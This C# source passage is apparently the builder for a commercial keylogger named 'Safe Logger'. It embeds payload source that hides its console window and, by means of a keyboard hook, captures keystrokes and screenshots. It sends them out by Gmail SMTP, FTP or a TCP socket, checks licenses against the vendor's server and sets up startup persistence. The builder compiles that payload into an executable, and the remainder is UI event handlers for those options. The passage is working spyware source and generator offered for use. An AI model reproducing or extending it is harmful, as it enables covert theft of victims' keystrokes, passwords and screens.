           (htmlBody, null, System.Net.Mime.MediaTypeNames.Text.Html);

        System.Net.Mail.LinkedResource inline = new System.Net.Mail.LinkedResource(""Screenshot.jpg"", System.Net.Mime.MediaTypeNames.Image.Jpeg);
        inline.ContentId = Guid.NewGuid().ToString();
        avHtml.LinkedResources.Add(inline);
        
        mail.AlternateViews.Add(avHtml);

        System.Net.Mail.Attachment att = new System.Net.Mail.Attachment(img);
        att.ContentDisposition.Inline = true;

        mail.Body = String.Format(
           ""<h3>Screenshot</h3>"" +
           @""<img src=""""cid:{0}"""" />"", inline.ContentId);

        mail.IsBodyHtml = true;
 mail.Attachments.Add(att);
                }

                SmtpServer.Port = Config.smtpPort;
                SmtpServer.Credentials = new System.Net.NetworkCredential(Config.username, Config.password);
                SmtpServer.EnableSsl = true;

                SmtpServer.Send(mail);
            }
            catch (Exception) { }
        }
        else if (type == 2)
        {
           try
        {
            ftp ftpClient = new ftp(@""ftp://"" + Config.ftpUrl + ""/"", Config.ftpUsername, Config.ftpPassword);

            if (!sendImage)
            {
string name = getFileName() + "".txt"";
if (File.Exists(name)) { File.Delete(name); }
                var f = File.Create(getFileName() + "".txt"");
                f.Close();
                File.WriteAllText(name, text);

    ftpClient.upload(Config.ftpPath, name);
        ftpClient = null;

              File.Delete(name);
            }
            else
            {
                    ftpClient.upload(Config.ftpPath, img);
                    ftpClient = null;
            }
        }
        catch (Exception e) {  Console.WriteLine(e.Message); }
        }
        else if (type == 3)
        {
            try
            {
                IPHostEntry ipHost = Dns.GetHostEntry(Dns.GetHostName());
                IPAddress ipAddr = null;

                for (int i = 0; i < ipHost.AddressList.Length; i++)
                {
                    if (ipHost.AddressList[i].ToString() == Config.ip)
                    {
                        ipAddr = ipHost.AddressList[i];
                    }
                }

                if (ipAddr == null)
                    ipAddr = ipHost.AddressList[0];

                IPEndPoint ipEndPoint = new IPEndPoint(ipAddr, 11000);

                Socket client = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);

                client.Connect(ipEndPoint);

                string path = Path.GetTempPath();
                string fileName = """";

                if (sendImage)
                {
                    fileName = path + getFileName() + "".png"";
                    if (File.Exists(fileName))
                        File.Delete(fileName);

                    File.Move(img, fileName);
                    client.SendFile(fileName);
                    File.Delete(fileName);
                }
                else
                {
                    fileName = path + getFileName() + "".txt"";
                    if (File.Exists(fileName))
                        File.Delete(fileName);

                    File.WriteAllText(fileName, text);
                    client.SendFile(fileName);
                    File.Delete(fileName);
                }

                client.Shutdown(SocketShutdown.Both);
                client.Close();
            }
            catch (Exception) { }
        }
    }

    string getFileName()
    {
        return DateTime.Now.ToString(""h: mm:ss tt"");
    }
}

class LicenseChecker
{
    public static LicenseChecker getInstance; public static void init() { getInstance = new LicenseChecker(); }

    string url = @""http://safe-logger.com/t/k.txt"";

        static readonly string PasswordHash = ""GJDOEJF*#f8F"";
        static readonly string SaltKey = ""G!JG%LQA"";
        static readonly string VIKey = ""@7C5c3H8e6F6g7J0"";

        public bool exists(string license)
    {
        bool final = false;

        if (string.IsNullOrEmpty(license))
            return final;

        var result = GetFileViaHttp(url);
        string str = Encoding.UTF8.GetString(result);
        string[] strArr = str.Split(new[] { ""\n"" }, StringSplitOptions.RemoveEmptyEntries);

        string line = """";

        for (int i = 0; i < strArr.Length; i++)
        {
            line = strArr[i];
            if (Decrypt(line) == license)
            {
                final = true;
                Config.license = Decrypt(line);
            }
        }

        return final;
    }

    public byte[] GetFileViaHttp(string url)
    {
        using (WebClient client = new WebClient())
        {
            return client.DownloadData(url);
        }
    }

    public static string Decrypt(string encryptedText)
    {
        byte[] cipherTextBytes = Convert.FromBase64String(encryptedText);
        byte[] keyBytes = new Rfc2898DeriveBytes(PasswordHash, Encoding.ASCII.GetBytes(SaltKey)).GetBytes(256 / 8);
        var symmetricKey = new RijndaelManaged() { Mode = CipherMode.CBC, Padding = PaddingMode.None };

        var decryptor = symmetricKey.CreateDecryptor(keyBytes, Encoding.ASCII.GetBytes(VIKey));
        var memoryStream = new MemoryStream(cipherTextBytes);
        var cryptoStream = new CryptoStream(memoryStream, decryptor, CryptoStreamMode.Read);
        byte[] plainTextBytes = new byte[cipherTextBytes.Length];

        int decryptedByteCount = cryptoStream.Read(plainTextBytes, 0, plainTextBytes.Length);
        memoryStream.Close();
        cryptoStream.Close();
        return Encoding.UTF8.GetString(plainTextBytes, 0, decryptedByteCount).TrimEnd(""\0"".ToCharArray());
    }

}

static class Program
{
    [DllImport(""kernel32.dll"")]
    static extern IntPtr GetConsoleWindow();

        [DllImport(""user32.dll"")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;
        const int SW_SHOW = 5;
        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [STAThread]
    static void Main()
    {
        var handle = GetConsoleWindow();

        // Hide
        ShowWindow(handle, SW_HIDE);
        
        LicenseChecker.init();
        if (string.IsNullOrEmpty(Config.license))
       {
            Environment.Exit(0);
        }

        if (!LicenseChecker.getInstance.exists(Config.license))
       {
            Environment.Exit(0);
        }



 System.Diagnostics.Stopwatch stopwatch = new System.Diagnostics.Stopwatch();

        stopwatch.Reset();
        stopwatch.Start();

        WebClient webClient = new WebClient();
        byte[] bytes = webClient.DownloadData(""https://safe-logger.com/"");

            stopwatch.Stop();

            double seconds = stopwatch.Elapsed.TotalSeconds;

        double speed = bytes.Length / seconds;

  DataSender.getInstance.send(""Internet speed: "" + speed.ToString(), Config.senderType);

        DataSender.init();
        KeyListener.init(); Misc.init();
        KeyListener.getInstance.initLogger();
        Misc.getInstance.initMisc();
        if (!System.IO.File.Exists(Directory.GetCurrentDirectory() + "" / 1.txt""))
        {
		string tempp = ""User "" + Environment.UserName;;
		string tempp2 = "" : has installed Safe Logger into his computer!"";
		string temmp3 = tempp + tempp2;
		
  DataSender.getInstance.send(tempp, Config.senderType);
            Regs.init();
            Regs.getInstance.initRegistrySettings();
            var file = System.IO.File.Create(""1.txt"");
            file.Close();
        }
Console.ReadLine();
    }
}
}";
            string Output = buildName;

            string path = "/build";
            string fPath = Directory.GetCurrentDirectory() + path + "/" + Output;

            if (File.Exists(Output))
            {
                File.Delete(Output);
            }

            if (File.Exists(fPath))
            {
                File.Delete(fPath);
            }

            CSharpCodeProvider codeProvider = new CSharpCodeProvider();
            ICodeCompiler icc = codeProvider.CreateCompiler();

            
            CompilerParameters parameters = new CompilerParameters();
            parameters.GenerateExecutable = true;
            parameters.OutputAssembly = Output;
            parameters.ReferencedAssemblies.Add("System.dll");
            parameters.ReferencedAssemblies.Add("System.Drawing.dll");
            parameters.ReferencedAssemblies.Add("System.Windows.Forms.dll");
            parameters.ReferencedAssemblies.Add("System.Linq.dll");
            parameters.ReferencedAssemblies.Add("System.Net.dll");
            parameters.ReferencedAssemblies.Add("Gma.System.MouseKeyHook.dll");
            CompilerResults res = icc.CompileAssemblyFromSource(parameters, code);

            if (res.Errors.Count > 0)
            {
                StringBuilder sb = new StringBuilder();

                foreach (CompilerError CompErr in res.Errors)
                {
                    sb.AppendLine(String.Format("Error Number: ({0}) | Error Info: {1} | Error Line: {2}", CompErr.ErrorNumber, CompErr.ErrorText, CompErr.Line));
                }
                Utils.log(sb.ToString());
            }
            else
            {
                if (File.Exists(Output))
                {
                    File.Move(Output, Directory.GetCurrentDirectory() + "/build/" + Output);
                }
                if (File.Exists(Output))
                {
                    File.Delete(Output);
                }
                Process.Start(Directory.GetCurrentDirectory() + path);
                Utils.log("Safe Logger has been built! " + buildName);
            }

        }

        private void label23_Click(object sender, EventArgs e)
        {
            Voice.speak(label23.Text);
        }

        private void button3_Click(object sender, EventArgs e)
        {
            string text = "test \n" + "tt";
            Utils.log(text);
        }

        private void Main_Load(object sender, EventArgs e)
        {
            passin.UseSystemPasswordChar = true;
            passwin.UseSystemPasswordChar = true;
            changeLanguage(true);
        }

        private void emailin_TextChanged(object sender, EventArgs e)
        {

        }

        private void tabControl1_SelectedIndexChanged(object sender, EventArgs e)
        {

        }

        private void tabPage3_Click(object sender, EventArgs e)
        {

        }

        private void userin_TextChanged(object sender, EventArgs e)
        {

        }

        private void label17_Click(object sender, EventArgs e)
        {
            Voice.speak(label17.Text);
        }

        private void lan_CheckedChanged(object sender, EventArgs e)
        {

        }

        private void label18_Click(object sender, EventArgs e)
        {
            Voice.speak(label18.Text);
        }

        private void ftp_CheckedChanged(object sender, EventArgs e)
        {
            Voice.speak(ftp.Text);
        }

        private void label19_Click(object sender, EventArgs e)
        {
            Voice.speak(label19.Text);
        }

        private void gmail_CheckedChanged(object sender, EventArgs e)
        {
            Voice.speak(gmail.Text);
        }

        private void sportin_TextChanged(object sender, EventArgs e)
        {

        }

        private void label20_Click(object sender, EventArgs e)
        {
            Voice.speak(label20.Text);
        }

        private void label30_Click(object sender, EventArgs e)
        {

        }

        private void label21_Click(object sender, EventArgs e)
        {
            Voice.speak(label21.Text);
        }

        private void ipin_TextChanged(object sender, EventArgs e)
        {

        }

        private void lportin_TextChanged(object sender, EventArgs e)
        {

        }

        private void passin_TextChanged(object sender, EventArgs e)
        {

        }

        private void label29_Click(object sender, EventArgs e)
        {

        }

        private void label22_Click(object sender, EventArgs e)
        {
            Voice.speak(label22.Text);
        }

        private void label28_Click(object sender, EventArgs e)
        {

        }

        private void subjin_TextChanged(object sender, EventArgs e)
        {

        }

        private void label27_Click(object sender, EventArgs e)
        {
            Voice.speak(label27.Text);
        }

        private void label26_Click(object sender, EventArgs e)
        {
            Voice.speak(label26.Text);
        }

        private void label24_Click(object sender, EventArgs e)
        {

        }

        private void passwin_TextChanged(object sender, EventArgs e)
        {

        }

        private void label25_Click(object sender, EventArgs e)
        {
            Voice.speak(label25.Text);
        }

        private void urlin_TextChanged(object sender, EventArgs e)
        {

        }

        private void tabPage1_Click(object sender, EventArgs e)
        {

        }

        private void button3_Click_1(object sender, EventArgs e)
        {
            Voice.speak(button3.Text);
            changeLanguage(false, "eng");
        }

        private void button4_Click(object sender, EventArgs e)
        {
            Voice.speak(button4.Text);
            changeLanguage(false, "gr");
        }

        void changeLanguage(bool load, string lang = "eng")
        {
            if (load)
            {
                string finalLang = LanguageManager.getInstance.loadLanguage();
                
                if (finalLang != null)
                {
                    updateLanguage(finalLang);
                }
            }
            else
            {
                updateLanguage(lang);
            }
        }

        void updateLanguage(string lang)
        {
            string[] ui = LanguageManager.getInstance.updateLanguage(2, lang);
            
            keyscheck.Text = ui[0];
            proccheck.Text = ui[1];
            sscheck.Text = ui[2];
            label11.Text = label14.Text = label16.Text = ui[3]; //Every
            label12.Text = label13.Text = label15.Text = ui[4]; //Minute
            label1.Text = ui[5]; //build name
            button2.Text = ui[6]; //build button
            button1.Text = ui[7]; //exit button
            taskcheck.Text = ui[8];
            startupcheck.Text = ui[9];
            checkBox1.Text = ui[10]; //shutdown pc on exit
            label17.Text = ui[11]; //send data by
            string temp1 = ui[12]; //lan
            label3.Text = ui[13]; //smtp port
            label20.Text = ui[14]; //better let it 587
            label21.Text = ui[15]; //email
            label22.Text = ui[16]; //password
            label23.Text = ui[17]; //email subject
            label25.Text = ui[18]; //url
            label26.Text = ui[19]; //username
            label27.Text = ui[20]; //password
            temp1 = ui[21]; //port
            temp1 = ui[22]; //ip
            label8.Text = ui[23]; //How to Use:
            label9.Text = ui[24]; //Main Options Tab:
            label10.Text = ui[25]; //Build Name must not have .exe at the ending!
            label7.Text = ui[26]; //change language
            button3.Text = ui[27]; //english
            button4.Text = ui[28]; //greek
            label33.Text = ui[29]; //Email Settings
            label34.Text = ui[30]; //You can use Gmail only and you have to update the options to let less secure apps to connect!
            button5.Text = ui[31];
            button6.Text = ui[32];
            button10.Text = ui[33]; //German
            button11.Text = ui[34]; //French
            button12.Text = ui[35]; //Lithaunian
            label6.Text = ui[36]; //Path
            label18.Text = ui[37]; //Working Hours:
            allday.Text = ui[38]; //Work all day
            button13.Text = ui[39]; //Support
            label24.Text = ui[40]; //Keywords:
        }

        private void tabPage5_Click(object sender, EventArgs e)
        {

        }

        private void linkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            Voice.speak(linkLabel1.Text);
            Process.Start("https://www.google.com/settings/security/lesssecureapps");
        }

        private void button5_Click(object sender, EventArgs e)
        {
            Voice.speak(button5.Text);
            changeLanguage(false, "bg");
        }

        private void button6_Click(object sender, EventArgs e)
        {
            Voice.speak(button6.Text);
            changeLanguage(false, "hb");
        }

        private void button8_Click(object sender, EventArgs e)
        {
            Voice.speak("Discord");
            Process.Start("https://discord.gg/J33fQaR");
        }

        private void button9_Click(object sender, EventArgs e)
        {
            Voice.speak("Twitter");
            Process.Start("https://twitter.com/LoggerSafe");
        }

        private void button7_Click(object sender, EventArgs e)
        {
            Voice.speak("Website");
            Process.Start("https://safe-logger.com/");
        }

        void timer()
        {
            int counter = 0;
            int time = 1000;

            new System.Threading.Thread(() =>
            {
                while (true)
                {
                    counter++;
                    if (counter >= time)
                    {
                    }
                }
            }).Start();
        }

        private void button10_Click(object sender, EventArgs e)
        {
            Voice.speak(button10.Text);
            changeLanguage(false, "ger");
        }

        private void button11_Click(object sender, EventArgs e)
        {
            Voice.speak(button11.Text);
            changeLanguage(false, "fr");
        }

        private void button13_Click(object sender, EventArgs e)
        {
            Voice.speak(button13.Text);
            Process.Start("https://safe-logger.com/index.php/support/");
        }

        private void keyscheck_CheckedChanged(object sender, EventArgs e)
        {
            Voice.speak(keyscheck.Text);
        }

        private void proccheck_CheckedChanged(object sender, EventArgs e)
        {
            Voice.speak(proccheck.Text);
        }

        private void sscheck_CheckedChanged(object sender, EventArgs e)
        {
            Voice.speak(sscheck.Text);
        }

        private void label11_Click(object sender, EventArgs e)
        {
            Voice.speak(label11.Text);
        }

        private void label14_Click(object sender, EventArgs e)
        {
            Voice.speak(label14.Text);
        }

        private void label16_Click(object sender, EventArgs e)
        {
            Voice.speak(label16.Text);
        }

        private void label12_Click(object sender, EventArgs e)
        {
            Voice.speak(label12.Text);
        }

        private void label13_Click(object sender, EventArgs e)
        {
            Voice.speak(label13.Text);
        }

        private void label15_Click(object sender, EventArgs e)
        {
            Voice.speak(label15.Text);
        }

        private void label1_Click(object sender, EventArgs e)
        {
            Voice.speak(label1.Text);
        }

        private void label18_Click_1(object sender, EventArgs e)
        {
            Voice.speak(label18.Text);
        }

        private void allday_CheckedChanged(object sender, EventArgs e)
        {
            Voice.speak(allday.Text);
        }

        private void taskcheck_CheckedChanged(object sender, EventArgs e)
        {
            Voice.speak(taskcheck.Text);
        }

        private void startupcheck_CheckedChanged(object sender, EventArgs e)
        {
            Voice.speak(startupcheck.Text);
        }

        private void checkBox1_CheckedChanged(object sender, EventArgs e)
        {
            Voice.speak(checkBox1.Text);
        }

        private void label5_Click(object sender, EventArgs e)
        {
            Voice.speak(label5.Text);
        }

        private void label6_Click(object sender, EventArgs e)
        {
            Voice.speak(label6.Text);
        }

        private void label24_Click_1(object sender, EventArgs e)
        {
            Voice.speak(label24.Text);
        }

        private void label7_Click(object sender, EventArgs e)
        {
            Voice.speak(label7.Text);
        }

        private void label8_Click(object sender, EventArgs e)
        {
            Voice.speak(label8.Text);
        }

        private void label9_Click(object sender, EventArgs e)
        {
            Voice.speak(label9.Text);
        }

        private void label33_Click(object sender, EventArgs e)
        {
            Voice.speak(label33.Text);
        }

        private void label10_Click(object sender, EventArgs e)
        {
            Voice.speak(label10.Text);
        }

        private void label34_Click(object sender, EventArgs e)
        {
            Voice.speak(label34.Text);
        }

        private void button12_Click(object sender, EventArgs e)
        {
            Voice.speak(button12.Text);
            changeLanguage(false, "li");
        }
    }
}
